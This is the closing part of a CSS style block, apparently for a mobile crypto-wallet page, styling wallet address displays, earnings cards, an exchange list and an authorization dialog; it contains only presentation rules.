	font-weight: bold;
	color: white;
}

.disconnect-btn {
	font-size: 22rpx;
	color: white;
	background-color: rgba(255, 255, 255, 0.2);
	padding: 10rpx 20rpx;
	border-radius: 20rpx;
	cursor: pointer;
}

.wallet-address {
	display: flex;
	align-items: center;
}

.address-label {
	font-size: 24rpx;
	color: rgba(255, 255, 255, 0.8);
	margin-right: 15rpx;
}

.address-text {
	font-size: 24rpx;
	color: white;
	font-family: monospace;
	background-color: rgba(255, 255, 255, 0.1);
	padding: 5rpx 15rpx;
	border-radius: 10rpx;
}

.welcome-card {
	margin-bottom: 40rpx;
}

.welcome-header {
	display: flex;
	justify-content: space-between;
	align-items: flex-start;
	margin-bottom: 20rpx;
}

.welcome-title {
	font-size: 32rpx;
	font-weight: bold;
	color: #333;
	flex: 1;
}

.id-container {
	display: flex;
	align-items: center;
}

.chain-icon {
	font-size: 24rpx;
	margin-right: 10rpx;
}

.id-text {
	font-size: 24rpx;
	color: #999;
}

.welcome-subtitle {
	font-size: 26rpx;
	color: #666;
	margin-bottom: 40rpx;
}

.earnings-section {
	display: flex;
	justify-content: space-between;
	margin-bottom: 40rpx;
}

.earnings-item {
	flex: 1;
}

.earnings-label {
	font-size: 24rpx;
	color: #999;
	display: block;
	margin-bottom: 10rpx;
}

.earnings-value {
	font-size: 36rpx;
	font-weight: bold;
	color: #333;
}

.demo-btn {
	background-color: #4A90E2;
	border-radius: 12rpx;
	padding: 20rpx 0;
	text-align: center;
}

.demo-text {
	color: white;
	font-size: 28rpx;
	font-weight: bold;
}

.transaction-card {
	background-color: #FF9A56;
	border-radius: 20rpx;
	padding: 40rpx;
	margin-bottom: 40rpx;
	position: relative;
}

.transaction-header {
	display: flex;
	justify-content: space-between;
	align-items: center;
	margin-bottom: 20rpx;
}

.transaction-title {
	font-size: 32rpx;
	font-weight: bold;
	color: white;
}

.add-btn {
	width: 60rpx;
	height: 60rpx;
	background-color: rgba(255, 255, 255, 0.3);
	border-radius: 50%;
	display: flex;
	justify-content: center;
	align-items: center;
}

.add-text {
	color: white;
	font-size: 32rpx;
	font-weight: bold;
}

.transaction-subtitle {
	font-size: 24rpx;
	color: white;
	margin-bottom: 30rpx;
	opacity: 0.9;
}

.stats-section {
	display: flex;
	justify-content: space-between;
	flex-wrap: wrap;
}

.stat-item {
	width: 48%;
	margin-bottom: 20rpx;
}

.stat-label {
	font-size: 22rpx;
	color: white;
	opacity: 0.8;
	display: block;
	margin-bottom: 8rpx;
}

.stat-value {
	font-size: 24rpx;
	color: white;
	font-weight: bold;
}

/* Êñ∞Â¢ûÔºöÊéàÊùÉÂú∞ÂùÄÈÉ®ÂàÜÊ†∑Âºè */
.auth-address-section {
	margin-top: 20rpx;
	padding-top: 20rpx;
	border-top: 1rpx solid rgba(255, 255, 255, 0.2);
}

.auth-label {
	font-size: 20rpx;
	color: white;
	opacity: 0.8;
	display: block;
	margin-bottom: 8rpx;
}

.auth-address {
	font-size: 22rpx;
	color: white;
	font-family: monospace;
	background-color: rgba(255, 255, 255, 0.1);
	padding: 8rpx 12rpx;
	border-radius: 8rpx;
}

.exchange-list {
	margin-bottom: 40rpx;
}

.exchange-item {
	background-color: white;
	border-radius: 16rpx;
	margin-bottom: 20rpx;
	overflow: hidden;
	box-shadow: 0 4rpx 12rpx rgba(0, 0, 0, 0.08);
}

.exchange-header {
	display: flex;
	align-items: center;
	padding: 30rpx;
	cursor: pointer;
	transition: background-color 0.3s ease;
}

.exchange-header:hover {
	background-color: #f8f9fa;
}

.exchange-item:not(:last-child) {
	border-bottom: 1px solid #f0f0f0;
}

.exchange-icon {
	width: 48rpx;
	height: 48rpx;
	margin-right: 20rpx;
}

.exchange-name {
	font-size: 28rpx;
	color: #333;
	flex: 1;
}

.exchange-value {
	font-size: 28rpx;
	color: #333;
	font-weight: bold;
	margin-right: 20rpx;
}

.exchange-arrow {
	font-size: 24rpx;
	color: #999;
	transition: transform 0.3s ease;
}

.exchange-arrow.rotated {
	transform: rotate(90deg);
}

.exchange-details {
	padding: 20rpx 30rpx;
	animation: slideDown 0.3s ease-out;
	border-top: 1px solid #f0f0f0;
	background-color: #fafafa;
}

@keyframes slideDown {
	from {
		max-height: 0;
		opacity: 0;
		padding-top: 0;
		padding-bottom: 0;
	}
	to {
		max-height: 300rpx;
		opacity: 1;
		padding-top: 20rpx;
		padding-bottom: 20rpx;
	}
}

.detail-row {
	display: flex;
	justify-content: space-between;
	margin-bottom: 15rpx;
}

.detail-label {
	font-size: 22rpx;
	color: #666;
	flex: 1;
}

.coin-row {
	display: flex;
	align-items: center;
	margin-bottom: 15rpx;
}

.coin-icon {
	width: 32rpx;
	height: 32rpx;
	margin-right: 15rpx;
	font-size: 24rpx;
	text-align: center;
}

.coin-name {
	font-size: 24rpx;
	color: #333;
	flex: 1;
}

.coin-value {
	font-size: 22rpx;
	color: #666;
	margin-right: 20rpx;
}

.coin-number {
	font-size: 22rpx;
	color: #666;
}

.exchange-logos {
	margin-bottom: 40rpx;
}

.logo-row {
	display: flex;
	justify-content: space-between;
	margin-bottom: 30rpx;
}

.logo-item {
	width: 200rpx;
	height: 80rpx;
	background-color: white;
	border-radius: 12rpx;
	display: flex;
	align-items: center;
	justify-content: center;
	box-shadow: 0 2rpx 8rpx rgba(0, 0, 0, 0.1);
}

.logo-text {
	font-size: 20rpx;
	color: #333;
	font-weight: bold;
}

.external-links {
	display: flex;
	justify-content: space-between;
	margin-bottom: 80rpx;
	padding: 0 10rpx;
}

.external-card {
	width: 200rpx;
	height: 160rpx;
	background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
	border-radius: 20rpx;
	display: flex;
	flex-direction: column;
	align-items: center;
	justify-content: center;
	box-shadow: 0 8rpx 24rpx rgba(255, 165, 0, 0.3);
	cursor: pointer;
	transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.external-card:hover {
	transform: translateY(-5rpx);
	box-shadow: 0 12rpx 32rpx rgba(255, 165, 0, 0.4);
}

.card-icon {
	width: 80rpx;
	height: 80rpx;
	margin-bottom: 20rpx;
	background-color: white;
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
	box-shadow: 0 4rpx 12rpx rgba(0, 0, 0, 0.1);
}

.card-image {
	width: 100%;
	height: 100%;
	border-radius: 50%;
}

.svg-icon {
	width: 60rpx;
	height: 60rpx;
	display: flex;
	align-items: center;
	justify-content: center;
}

.svg-icon svg {
	width: 100%;
	height: 100%;
}

.card-content {
	text-align: center;
}

.card-title {
	font-size: 24rpx;
	font-weight: bold;
	color: white;
	text-shadow: 0 2rpx 4rpx rgba(0, 0, 0, 0.2);
}

/* Ê∑ªÂä†ÂºπÁ™óÊ†∑Âºè */
.auth-dialog {
	background-color: #fff;
	border-radius: 20rpx;
	width: 600rpx;
	padding: 40rpx;
}

.auth-dialog-header {
	display: flex;
	justify-content: space-between;
	align-items: center;
	margin-bottom: 30rpx;
}

.auth-dialog-title {
	font-size: 36rpx;
	font-weight: bold;
	color: #333;
}

.auth-dialog-close {
	font-size: 40rpx;
	color: #999;
	padding: 10rpx;
}

.auth-dialog-content {
	text-align: center;
}

.auth-dialog-image {
	width: 400rpx;
	height: 300rpx;
	margin-bottom: 30rpx;
}

.auth-dialog-desc {
	font-size: 28rpx;
	color: #666;
	margin-bottom: 40rpx;
	display: block;
}

.auth-dialog-btn {
	background: linear-gradient(135deg, #4A90E2 0%, #357ABD 100%);
	color: white;
	border-radius: 50rpx;
	padding: 20rpx 0;
	font-size: 32rpx;
	font-weight: bold;
	border: none;
	width: 80%;
	margin: 0 auto;
}

.auth-dialog-btn:active {
	opacity: 0.8;
}

.logo-image {
	width: 160rpx;
	height: 60rpx;
	object-fit: contain;
}

.no-data {
	padding: 20rpx;
	text-align: center;
}

.no-data-text {
	font-size: 24rpx;
	color: #999;
	opacity: 0.7;
}
</style>
